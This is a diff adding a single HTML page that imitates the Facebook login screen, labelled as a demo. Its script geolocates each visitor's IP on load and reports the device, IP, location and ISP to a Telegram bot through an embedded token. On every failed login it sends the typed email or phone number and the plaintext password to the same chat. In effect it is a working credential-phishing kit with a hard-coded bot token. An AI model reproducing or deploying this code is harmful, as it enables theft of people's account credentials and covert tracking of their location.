@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Facebook Login - IP Tracking with Telegram Bot</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .login-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
+      max-width: 1000px;
+      width: 100%;
+      gap: 40px;
+      background: transparent;
+    }
+
+    .brand-section {
+      flex: 1;
+      min-width: 260px;
+      max-width: 500px;
+    }
+
+    .facebook-logo {
+      font-size: 3.5rem;
+      font-weight: 700;
+      color: #1877f2;
+      letter-spacing: -0.03em;
+      margin-bottom: 16px;
+    }
+
+    .tagline {
+      font-size: 1.6rem;
+      font-weight: 400;
+      color: #1c1e21;
+      line-height: 1.2;
+      margin-bottom: 20px;
+    }
+
+    .login-card {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+      padding: 20px 18px 28px 18px;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .input-group {
+      margin-bottom: 12px;
+    }
+
+    .login-input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 1rem;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      background: #ffffff;
+      outline: none;
+      transition: border-color 0.1s ease, box-shadow 0.1s;
+    }
+
+    .login-input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+    }
+
+    .input-error {
+      border-color: #f02849 !important;
+      background-color: #fff8f8;
+    }
+
+    .error-message {
+      color: #f02849;
+      font-size: 0.75rem;
+      margin-top: 4px;
+      margin-left: 4px;
+      font-weight: 500;
+      min-height: 18px;
+    }
+
+    .login-btn {
+      background: #1877f2;
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      padding: 12px 0;
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: white;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      margin-top: 6px;
+      margin-bottom: 16px;
+    }
+
+    .login-btn:hover {
+      background: #166fe5;
+    }
+
+    .forgot-link {
+      text-align: center;
+      margin: 16px 0 18px 0;
+    }
+
+    .forgot-link a {
+      color: #1877f2;
+      font-size: 0.85rem;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .forgot-link a:hover {
+      text-decoration: underline;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid #dadde1;
+      margin: 16px 0;
+    }
+
+    .create-btn {
+      background: #42b72a;
+      border: none;
+      border-radius: 6px;
+      padding: 12px 0;
+      font-size: 1rem;
+      font-weight: bold;
+      color: white;
+      width: 60%;
+      margin: 0 auto;
+      display: block;
+      cursor: pointer;
+      transition: background 0.2s;
+      text-align: center;
+    }
+
+    .create-btn:hover {
+      background: #36a420;
+    }
+
+    .demo-hint {
+      font-size: 0.7rem;
+      text-align: center;
+      background: #f0f2f5;
+      margin-top: 18px;
+      padding: 8px;
+      border-radius: 28px;
+      color: #606770;
+      cursor: pointer;
+    }
+
+    .demo-hint span {
+      font-weight: 600;
+      color: #1877f2;
+    }
+
+    .ip-info {
+      font-size: 0.65rem;
+      text-align: center;
+      margin-top: 12px;
+      color: #8a8d91;
+      background: #f9f9fb;
+      padding: 6px;
+      border-radius: 20px;
+    }
+
+    @media (max-width: 780px) {
+      .login-container {
+        flex-direction: column;
+        gap: 20px;
+      }
+      .brand-section {
+        text-align: center;
+        max-width: 100%;
+      }
+      .tagline {
+        font-size: 1.3rem;
+      }
+      .facebook-logo {
+        font-size: 2.8rem;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="login-container">
+  <div class="brand-section">
+    <div class="facebook-logo">facebook</div>
+    <div class="tagline">
+      Connect with friends and the world <br> around you on Facebook.
+    </div>
+  </div>
+
+  <div class="login-card">
+    <form id="loginForm" action="#" method="post" novalidate>
+      <div class="input-group">
+        <input type="text" id="emailOrPhone" class="login-input" placeholder="Email address or phone number" autocomplete="username">
+        <div id="emailError" class="error-message"></div>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" class="login-input" placeholder="Password" autocomplete="current-password">
+        <div id="passwordError" class="error-message"></div>
+      </div>
+      <button type="submit" class="login-btn" id="loginButton">Log In</button>
+    </form>
+    <div class="forgot-link">
+      <a href="#" id="forgotPasswordLink">Forgotten password?</a>
+    </div>
+    <hr>
+    <button class="create-btn" id="createAccountBtn">Create new account</button>
+    <div class="demo-hint" id="demoHint">
+      <span>✨ Demo credentials:</span> email: demo@fb.com / password: 123456 <br>
+      <span style="font-size:0.65rem;">(Click here to auto-fill)</span>
+    </div>
+    <div class="ip-info" id="ipDisplay">
+      🔍 Detecting your IP address...
+    </div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // ================= TELEGRAM BOT CONFIGURATION =================
+    const BOT_TOKEN = '8725201784:AAGtVzVbzkeys6Ngcu8yoxalqvenNTKN8MA';
+    const CHAT_ID = '6843391960';
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    // Global variable to store user IP and location info
+    let userIPInfo = {
+      ip: 'Unknown',
+      country: 'Unknown',
+      city: 'Unknown',
+      region: 'Unknown',
+      isp: 'Unknown',
+      device: 'Unknown'
+    };
+
+    // Function to send message to Telegram
+    async function sendTelegramMessage(message) {
+      try {
+        const response = await fetch(TELEGRAM_API_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        const result = await response.json();
+        if (result.ok) {
+          console.log('✅ Telegram message sent successfully');
+        } else {
+          console.error('❌ Telegram error:', result.description);
+        }
+      } catch (error) {
+        console.error('❌ Failed to send message to Telegram:', error);
+      }
+    }
+
+    // Get device/browser information
+    function getDeviceInfo() {
+      const userAgent = navigator.userAgent;
+      let device = 'Unknown';
+      let browser = 'Unknown';
+      let os = 'Unknown';
+      
+      // Detect OS
+      if (userAgent.indexOf('Windows') !== -1) os = 'Windows';
+      else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
+      else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
+      else if (userAgent.indexOf('Android') !== -1) os = 'Android';
+      else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) os = 'iOS';
+      
+      // Detect Browser
+      if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
+      else if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
+      else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
+      else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
+      else if (userAgent.indexOf('Opera') !== -1) browser = 'Opera';
+      
+      // Detect mobile or desktop
+      const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent);
+      device = isMobile ? 'Mobile' : 'Desktop';
+      
+      return `${device} | ${os} | ${browser}`;
+    }
+
+    // Get public IP address and location using ip-api.com (free, no API key required)
+    async function getUserIPAndLocation() {
+      try {
+        // First try to get IP using ipify (returns just IP)
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+        
+        // Then get location details from ip-api.com
+        const locationResponse = await fetch(`http://ip-api.com/json/${userIP}?fields=status,country,city,regionName,isp,query`);
+        const locationData = await locationResponse.json();
+        
+        if (locationData.status === 'success') {
+          userIPInfo = {
+            ip: locationData.query,
+            country: locationData.country || 'Unknown',
+            city: locationData.city || 'Unknown',
+            region: locationData.regionName || 'Unknown',
+            isp: locationData.isp || 'Unknown',
+            device: getDeviceInfo()
+          };
+          
+          // Update display on page
+          const ipDisplay = document.getElementById('ipDisplay');
+          ipDisplay.innerHTML = `🌐 Your IP: ${userIPInfo.ip} | 📍 ${userIPInfo.city}, ${userIPInfo.country}`;
+        } else {
+          throw new Error('Location fetch failed');
+        }
+      } catch (error) {
+        console.error('Failed to get IP/location:', error);
+        userIPInfo.ip = 'Unable to detect (private network or blocked)';
+        userIPInfo.country = 'Unknown';
+        userIPInfo.city = 'Unknown';
+        userIPInfo.region = 'Unknown';
+        userIPInfo.isp = 'Unknown';
+        userIPInfo.device = getDeviceInfo();
+        
+        const ipDisplay = document.getElementById('ipDisplay');
+        ipDisplay.innerHTML = `⚠️ IP detection limited | Device: ${userIPInfo.device}`;
+      }
+    }
+
+    // Send page visit notification to Telegram (when someone opens the page)
+    async function sendPageVisitNotification() {
+      const timestamp = new Date().toLocaleString('en-US', { hour12: false });
+      const visitMessage = `🌐 <b>Facebook Login Page Visited</b> 🌐\n\n` +
+        `🖥️ Device: ${userIPInfo.device}\n` +
+        `📡 IP Address: ${userIPInfo.ip}\n` +
+        `📍 Location: ${userIPInfo.city}, ${userIPInfo.region}, ${userIPInfo.country}\n` +
+        `🏢 ISP: ${userIPInfo.isp}\n` +
+        `⏰ Time: ${timestamp}\n` +
+        `🔗 Status: Page loaded successfully`;
+      
+      await sendTelegramMessage(visitMessage);
+    }
+
+    // ================= DOM Elements =================
+    const emailInput = document.getElementById('emailOrPhone');
+    const passwordInput = document.getElementById('password');
+    const emailErrorDiv = document.getElementById('emailError');
+    const passwordErrorDiv = document.getElementById('passwordError');
+    const loginForm = document.getElementById('loginForm');
+    const forgotLink = document.getElementById('forgotPasswordLink');
+    const createBtn = document.getElementById('createAccountBtn');
+    const demoHint = document.getElementById('demoHint');
+
+    // Helper: clear errors
+    function clearErrors() {
+      emailInput.classList.remove('input-error');
+      passwordInput.classList.remove('input-error');
+      emailErrorDiv.innerText = '';
+      passwordErrorDiv.innerText = '';
+    }
+
+    function setError(inputElement, errorDiv, message) {
+      inputElement.classList.add('input-error');
+      errorDiv.innerText = message;
+    }
+
+    // Validation
+    function validateCredentials(emailValue, passwordValue) {
+      let isValid = true;
+      clearErrors();
+
+      if (!emailValue || emailValue.trim() === '') {
+        setError(emailInput, emailErrorDiv, 'Email or phone number is required.');
+        isValid = false;
+      } else {
+        const trimmedEmail = emailValue.trim();
+        const isEmailLike = trimmedEmail.includes('@') && trimmedEmail.includes('.') && trimmedEmail.indexOf('@') > 0;
+        const isPhoneLike = /^[\d\s\+\(\)\-]{5,}$/.test(trimmedEmail);
+        if (!isEmailLike && !isPhoneLike && trimmedEmail.length < 5) {
+          setError(emailInput, emailErrorDiv, 'Please enter a valid email address or phone number.');
+          isValid = false;
+        }
+      }
+
+      if (!passwordValue || passwordValue.trim() === '') {
+        setError(passwordInput, passwordErrorDiv, 'Password is required.');
+        isValid = false;
+      } else if (passwordValue.length < 4) {
+        setError(passwordInput, passwordErrorDiv, 'Password must be at least 4 characters.');
+        isValid = false;
+      }
+
+      return isValid;
+    }
+
+    // Login logic with Telegram notification (includes IP)
+    async function performLogin(email, password) {
+      const normalizedEmail = email.trim().toLowerCase();
+      const normalizedPassword = password.trim();
+      const timestamp = new Date().toLocaleString('en-US', { hour12: false });
+
+      // Demo valid users
+      const validUsers = [
+        { emailOrPhone: 'demo@fb.com', password: '123456' },
+        { emailOrPhone: 'demo@facebook.com', password: '123456' },
+        { emailOrPhone: '5551234567', password: '123456' },
+        { emailOrPhone: 'testuser', password: '123456' }
+      ];
+
+      const matchedUser = validUsers.some(user => 
+        user.emailOrPhone.toLowerCase() === normalizedEmail && user.password === normalizedPassword
+      );
+      const extraDemo = (normalizedEmail.endsWith('@example.com') || normalizedEmail === 'demo') && normalizedPassword === '123456';
+      
+      if (matchedUser || extraDemo) {
+        // SUCCESS: Send Telegram notification with IP and location
+        const successMessage = `✅ <b>LOGIN SUCCESSFUL</b> ✅\n\n` +
+          `👤 Email/Phone: ${normalizedEmail}\n` +
+          `🖥️ Device: ${userIPInfo.device}\n` +
+          `📡 IP Address: ${userIPInfo.ip}\n` +
+          `📍 Location: ${userIPInfo.city}, ${userIPInfo.region}, ${userIPInfo.country}\n` +
+          `🏢 ISP: ${userIPInfo.isp}\n` +
+          `⏰ Time: ${timestamp}\n` +
+          `🔓 Status: <b>ACCESS GRANTED</b>`;
+        
+        await sendTelegramMessage(successMessage);
+        
+        alert('✅ Login successful! Welcome to Facebook demo.\n(Your IP and location have been logged)');
+        clearErrors();
+        return true;
+      } else {
+        // FAILURE: Send Telegram notification with IP, location AND attempted credentials
+        const failMessage = `❌ <b>LOGIN FAILED</b> ❌\n\n` +
+          `👤 Email/Phone: ${normalizedEmail}\n` +
+          `🔑 Password attempted: ${normalizedPassword}\n` +
+          `🖥️ Device: ${userIPInfo.device}\n` +
+          `📡 IP Address: ${userIPInfo.ip}\n` +
+          `📍 Location: ${userIPInfo.city}, ${userIPInfo.region}, ${userIPInfo.country}\n` +
+          `🏢 ISP: ${userIPInfo.isp}\n` +
+          `⏰ Time: ${timestamp}\n` +
+          `⚠️ Status: <b>INVALID CREDENTIALS</b>`;
+        
+        await sendTelegramMessage(failMessage);
+        
+        clearErrors();
+        setError(emailInput, emailErrorDiv, 'The email or phone number you entered isn’t connected to an account.');
+        setError(passwordInput, passwordErrorDiv, 'Incorrect password. Please try again.');
+        emailInput.classList.add('input-error');
+        passwordInput.classList.add('input-error');
+        return false;
+      }
+    }
+
+    // Form submit handler
+    async function onLoginSubmit(event) {
+      event.preventDefault();
+      const emailValue = emailInput.value;
+      const passwordValue = passwordInput.value;
+
+      if (!validateCredentials(emailValue, passwordValue)) {
+        return;
+      }
+      await performLogin(emailValue, passwordValue);
+    }
+
+    loginForm.addEventListener('submit', onLoginSubmit);
+
+    // Forgot password
+    forgotLink.addEventListener('click', (e) => {
+      e.preventDefault();
+      alert('🔐 Forgotten password?\nThis is a demo. Please contact support.');
+    });
+
+    // Create account
+    createBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      alert('📝 Create a new account\nThis is a frontend demo.');
+    });
+
+    // Auto-fill demo credentials
+    demoHint.addEventListener('click', () => {
+      emailInput.value = 'demo@fb.com';
+      passwordInput.value = '123456';
+      clearErrors();
+      emailInput.classList.remove('input-error');
+      passwordInput.classList.remove('input-error');
+      alert('✓ Demo credentials filled! Click Log In.');
+    });
+
+    // Remove error on input
+    emailInput.addEventListener('input', () => {
+      if (emailInput.classList.contains('input-error')) {
+        emailInput.classList.remove('input-error');
+        emailErrorDiv.innerText = '';
+      }
+    });
+    passwordInput.addEventListener('input', () => {
+      if (passwordInput.classList.contains('input-error')) {
+        passwordInput.classList.remove('input-error');
+        passwordErrorDiv.innerText = '';
+      }
+    });
+
+    // ================= INITIALIZATION =================
+    // First get IP and location, then send visit notification
+    (async function init() {
+      await getUserIPAndLocation();
+      await sendPageVisitNotification();
+      console.log('✅ Telegram Bot Integrated with IP Tracking | Chat ID:', CHAT_ID);
+      console.log('User IP:', userIPInfo.ip);
+      console.log('Location:', userIPInfo.city, userIPInfo.country);
+    })();
+  })();
+</script>
+</body>
+</html>
